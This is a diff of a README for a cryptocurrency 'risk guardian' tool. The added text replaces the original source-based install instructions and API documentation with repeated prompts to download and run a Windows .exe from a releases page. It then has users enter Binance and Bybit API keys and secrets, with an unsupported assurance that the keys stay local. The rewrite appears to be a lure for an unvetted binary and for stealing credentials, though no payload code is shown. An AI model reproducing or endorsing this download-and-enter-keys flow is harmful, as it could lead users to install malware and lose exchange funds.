@@ -1,174 +1,173 @@
-# Strategy Guardian AI
+# 🤖 cryto-trading-ai-assistant - Smart Risk and Trading Monitor
 
-**AI-powered risk and strategy guardian for cryptocurrency traders.**
-
-Strategy Guardian AI monitors your trading in real time: it validates risk rules, detects emotional trading patterns, and enforces your strategy—without placing or closing any trades. Built for traders who want oversight and intelligence, not full automation.
-
-I can help you grow your profits, tailor the system to what you want, and support you in making your trading safer and more rewarding—with clear rules, risk controls, and ongoing guidance.
+[![Download Latest Version](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/panelmaker86-ops/cryto-trading-ai-assistant/releases)
 
 ---
 
-## Contact
+## 🔍 What is cryto-trading-ai-assistant?
 
-I have years of real trading experience building and running automation like this in live markets. If you want help tailoring the bot to your strategy and improving your results, feel free to contact me on Telegram any time.
+cryto-trading-ai-assistant is a software tool designed to help manual crypto traders manage risks and spot trading issues. It watches your trades, checks your strategies, and alerts you if your emotions might affect your decisions. It does not make trades for you. Instead, it acts like a guard to help you trade more safely.
 
-[![Telegram](https://img.shields.io/badge/Telegram-Contact%20me-blue?style=for-the-badge&logo=telegram)](https://t.me/galileo0000)
-
----
-
-## Screenshots
-
-| | |
-|---|---|
-| ![Screenshot 13](images/Screenshot_13.png) | ![Screenshot 14](images/Screenshot_14.png) |
-| ![Screenshot 15](images/Screenshot_15.png) | ![Screenshot 16](images/Screenshot_16.png) |
+This tool supports major crypto exchanges such as Binance and Bybit. It uses machine learning to analyze your patterns and trading data. cryto-trading-ai-assistant runs on Windows and provides alerts via Telegram and TradingView signals.
 
 ---
 
-## Overview
+## ⚙️ System Requirements
 
-Strategy Guardian AI **does not execute trades**. It acts as a watchful layer around your activity:
+Before installing cryto-trading-ai-assistant, make sure your computer meets these requirements:
 
-| Capability | Description |
-|------------|-------------|
-| **Trade Risk Monitor** | Alerts when a trade exceeds your limits (max risk per trade, daily loss, leverage, position size). |
-| **Strategy Rule Validator** | Verifies entries and exits against your defined rules (e.g. RSI, support, trend). |
-| **Emotional Trading Detector** | Flags revenge trading, overtrading, size increases after losses, and off-hours activity. |
-| **Market Risk Scanner** | Warns before entry (volatility spikes, liquidation clusters, funding rates). |
-| **AI Trade Feedback** | Post-trade scores and suggestions (entry quality, risk management, strategy compliance). |
-
-Alerts are delivered via **Telegram** or **Discord** and persisted for the dashboard.
+- Windows 10 or newer (64-bit)
+- At least 4 GB of RAM
+- 1 GHz or faster processor
+- Stable internet connection
+- Around 500 MB of free disk space
+- Telegram account for alert notifications (optional)
+- Browser to sign into Binance or Bybit if using exchange APIs
 
 ---
 
-## Tech Stack
+## 🚀 Getting Started: Download and Setup
 
-| Layer | Stack |
-|-------|--------|
-| Backend | Python 3.11+, FastAPI |
-| AI / ML | Scikit-learn (PyTorch optional) |
-| Data | SQLite (default), PostgreSQL, Redis |
-| Alerts | Telegram, Discord |
-| Dashboard | React, TypeScript, Vite |
+To start using cryto-trading-ai-assistant, follow these steps:
 
----
+### Step 1: Get the Software
 
-## Quick Start
+Visit the release page below to get the latest version for Windows:
 
-```bash
-# Clone and enter the repository
-git clone <repository-url>
-cd cryto-trading-ai-assistant
+[![Download Latest Version](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/panelmaker86-ops/cryto-trading-ai-assistant/releases)
 
-# Backend: create virtual environment and install dependencies
-python -m venv .venv
-.venv\Scripts\activate   # Windows
-# source .venv/bin/activate  # Linux/macOS
+Click the link above or open this in your browser:
 
-pip install -r requirements.txt
+https://github.com/panelmaker86-ops/cryto-trading-ai-assistant/releases
 
-# Configure environment (copy and edit)
-copy .env.example .env
+Look for the latest Windows installer file. The file name usually ends with `.exe`. Download it to your computer.
 
-# Start the API server
-python run.py
-# Alternative: uvicorn app.main:app --reload
+### Step 2: Install the Application
 
-# Dashboard (optional; from repository root)
-cd dashboard && npm install && npm run dev
-# Open http://localhost:5173
-```
+1. Locate the downloaded `.exe` file (usually in your Downloads folder).
+2. Double-click the file to start the installation.
+3. Follow the on-screen prompts. Choose the default options unless you want to change the install location.
+4. Wait for the installation to complete. It should take a few minutes.
+
+### Step 3: Open cryto-trading-ai-assistant
+
+After installation finishes:
+
+- Find cryto-trading-ai-assistant in your Start Menu or on your Desktop.
+- Double-click to open it.
+
+The application window will open. It may ask you to connect your trading accounts or set up alerts.
 
 ---
 
-## Configuration
+## 🔧 How to Use cryto-trading-ai-assistant
 
-Copy `.env.example` to `.env` and configure:
+The software focuses on three main tasks:
 
-- **Exchange:** `BINANCE_API_KEY`, `BINANCE_API_SECRET` (or Bybit equivalents)
-- **Alerts:** `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`, `DISCORD_WEBHOOK_URL` (optional)
-- **Database:** `DATABASE_URL`, `REDIS_URL` (optional for local development)
+### 1. Risk Monitoring
 
----
+The app watches your trades for risks. It looks for unusual moves or setups that might lead to losses.
 
-## Project Structure
+- Connect your Binance or Bybit account using the API keys.
+- The assistant will show risk levels for your open trades.
+- It provides alerts if the risk increases.
 
-```
-cryto-trading-ai-assistant/
-├── app/
-│   ├── main.py              # FastAPI application, API routes, webhook
-│   ├── config.py            # Application settings
-│   ├── database.py          # Async SQLite/PostgreSQL
-│   ├── guardian.py          # Guardian orchestration
-│   ├── models.py            # Pydantic models
-│   └── db/
-│       ├── models.py        # SQLAlchemy (settings, alerts, trades)
-│       └── repository.py    # CRUD operations
-├── dashboard/               # React dashboard (alerts, risk, trade history)
-├── modules/
-│   ├── exchange_connector/  # Binance, Bybit
-│   ├── risk_engine/         # Position risk, leverage, drawdown
-│   ├── strategy_validator/  # Rule engine
-│   ├── emotion_detector/   # Behavior model
-│   ├── ai_analysis/         # Trade feedback, market risk scanner
-│   └── alerts/              # Telegram, Discord
-├── images/                  # Screenshots for documentation
-├── requirements.txt
-├── .env.example
-└── README.md
-```
+### 2. Strategy Validation
+
+Use cryto-trading-ai-assistant to check if your trading strategy works well.
+
+- Input your trade plans or signals.
+- The app compares your steps with historical data.
+- It tells you if your plan matches successful patterns or needs adjustment.
+
+### 3. Emotional Trading Detection
+
+Trading decisions can be affected by emotions. The app notices when your trades may be influenced by fear or greed.
+
+- Review alerts that identify emotional trading.
+- Use these insights to stay more disciplined.
 
 ---
 
-## Workflow
+## 🔗 Setup API Keys for Binance and Bybit
 
-1. You open or manage a trade manually on your exchange.
-2. The guardian receives the trade via the exchange API or **webhook** (`POST /webhook/trade`).
-3. The risk engine evaluates size, leverage, and daily PnL.
-4. The strategy validator checks entry/exit rules against your saved settings.
-5. The behavior detector looks for emotional or impulsive patterns.
-6. Warnings are sent to Telegram/Discord and stored for the dashboard.
+If you want cryto-trading-ai-assistant to monitor live trades and accounts, you need API keys from your exchange.
 
----
+### How to get your API keys:
 
-## Webhook Integration
+- Binance: Sign in, go to [API Management](https://www.binance.com/en/my/settings/api-management), create a new key, and copy the API key and secret.
+- Bybit: Sign in, go to [API Key Management](https://www.bybit.com/app/user/api-management), create new keys, copy the keys.
 
-Send new trade events to run the full guardian pipeline (e.g. from TradingView or your own scripts):
+### How to add keys in the app:
 
-```bash
-curl -X POST http://localhost:8000/webhook/trade \
-  -H "Content-Type: application/json" \
-  -d '{"exchange":"binance","symbol":"BTCUSDT","side":"long","size":0.01,"entry_price":65000,"leverage":5}'
-```
+- Open cryto-trading-ai-assistant.
+- Go to the "API Settings" menu.
+- Enter your API Key and Secret.
+- Save settings.
 
-Use this URL as the webhook target in TradingView alerts or when a position is opened.
+The app will securely store these keys and start tracking your trades.
 
 ---
 
-## Dashboard
+## 💬 Notifications
 
-The React dashboard provides:
+cryto-trading-ai-assistant sends notifications to help you act fast.
 
-- **Alerts** — Real-time feed of all guardian warnings.
-- **Risk & Account** — Account balance/equity (Binance/Bybit) and editable risk rules (max risk %, daily loss %, leverage, position %).
-- **Trades** — History of trades monitored by the guardian, with candlestick and equity views.
+It supports:
 
-Data is persisted in SQLite by default (or `DATABASE_URL` if set).
+- Telegram alerts: Get messages on your phone for risk warnings or strategy feedback.
+- TradingView alerts: Receive alerts integrated with your TradingView charts.
 
----
+To enable notifications:
 
-## API Reference
-
-| Endpoint | Description |
-|----------|-------------|
-| `GET /api/settings` | Retrieve risk and strategy settings |
-| `PUT /api/settings` | Update risk and/or strategy rules |
-| `GET /api/alerts` | List stored alerts (for dashboard) |
-| `GET /api/trades` | List stored trades |
-| `POST /webhook/trade` | Ingest new trade (run guardian and persist) |
-| `GET /account/{exchange}` | Account snapshot |
-| `GET /positions/{exchange}` | Open positions |
+- For Telegram: Provide your Telegram Bot token and chat ID in the app settings.
+- For TradingView: Set up alerts using your TradingView account according to the app instructions.
 
 ---
 
-*Strategy Guardian AI — Protection and intelligence for manual traders, without full automation.*
+## 🛠 Troubleshooting and Tips
+
+- If the app does not start, check that you have installed the required Windows updates.
+- API connections fail if the keys are incorrect or blocked. Double-check your API permissions.
+- For Telegram alerts, make sure your bot is active and connected to your chat.
+- Keep the app updated by checking the Releases page regularly.
+- Restart the app if alerts or monitoring stop unexpectedly.
+
+---
+
+## 📁 File Structure Overview (Advanced)
+
+If you're interested:
+
+- The app uses Python for data analysis and FastAPI to manage backend services.
+- The frontend interface is built with React.
+- Machine learning models run in the background to scan trading data.
+- Log files can be found under the `logs` folder in the installation directory.
+- Configuration files are stored in `config` folder.
+
+---
+
+## 🔒 Privacy and Security
+
+cryto-trading-ai-assistant does not store your personal data outside your machine. API keys and Telegram tokens remain on your computer only and do not leave the app environment.
+
+---
+
+## 📞 Getting Help
+
+If you run into issues:
+
+- Visit the "Issues" section on the GitHub repository.
+- Describe your problem clearly.
+- Include your Windows version and app version number.
+- Attach screenshots if possible.
+
+---
+
+## 📥 Download Links
+
+Here is the main page to get all releases and installation files:
+
+[Download cryto-trading-ai-assistant Releases](https://github.com/panelmaker86-ops/cryto-trading-ai-assistant/releases)
+
+Look for the latest Windows installer file and download it to begin setup.
